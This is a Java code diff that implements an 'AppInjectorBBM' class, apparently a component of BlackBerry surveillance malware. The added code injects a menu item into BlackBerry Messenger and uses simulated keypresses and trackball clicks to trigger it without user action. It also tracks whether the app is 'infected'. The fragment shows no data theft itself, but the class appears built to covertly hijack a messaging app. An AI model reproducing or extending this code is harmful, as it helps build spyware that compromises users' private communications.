@@ -40,21 +40,59 @@ public class AppInjectorBBM implements AppInjectorInterface, Singleton {
     }
 
     public boolean injectMenu() {
-        // TODO Auto-generated method stub
-        return false;
-    }
-
-    public boolean callMenuByKey() {
-        // TODO Auto-generated method stub
-        return false;
+        //#ifdef DEBUG
+        debug.trace("injectMenu");
+        //#endif
+        menu.addMenuBBM();
+        return true;
     }
 
     public boolean deleteMenu() {
-        // TODO Auto-generated method stub
-        return false;
+        //#ifdef DEBUG
+        debug.trace("deleteMenu");
+        //#endif
+        menu.removeMenuBBM();
+        return true;
     }
 
+    public boolean callMenuByKey(int kind) {
+        //#ifdef DEBUG
+        debug.info("calling browser menu");
+        //#endif
+
+        
+        //KeyInjector.pressKeyCode(Keypad.KEY_MENU);
+       
+        if(kind % 2 ==0){
+            //#ifdef DEBUG
+            debug.trace("callMenuByKey press raw key");
+            //#endif
+            KeyInjector.pressRawKeyCode(Keypad.KEY_MENU);
+            Utils.sleep(500);
+            KeyInjector.pressRawKey(menu.toString().toLowerCase().charAt(0));
+            Utils.sleep(500);
+            KeyInjector.trackBallRawClick();
+        }else{
+            //#ifdef DEBUG
+            debug.trace("callMenuByKey press key");
+            //#endif
+            KeyInjector.pressKeyCode(Keypad.KEY_MENU);
+            Utils.sleep(500);
+            KeyInjector.pressKey(menu.toString().toLowerCase().charAt(0));
+            Utils.sleep(500);
+            KeyInjector.trackBallClick();
+        }
+
+        return true;
+    }
+
+
+
     public boolean menuRun() {
+        //#ifdef DEBUG
+        debug.trace("menuRun");
+        //#endif
+        
         menu.addMenuBBM();
 
         Utils.sleep(100);
@@ -87,10 +125,15 @@ public class AppInjectorBBM implements AppInjectorInterface, Singleton {
         // TODO Auto-generated method stub
         
     }
-
+    
+    boolean infected;
     public boolean isInfected() {
-        // TODO Auto-generated method stub
-        return false;
+        
+        return infected;
+    }
+
+    public void setInfected() {
+       infected = true;
     }
 
 }
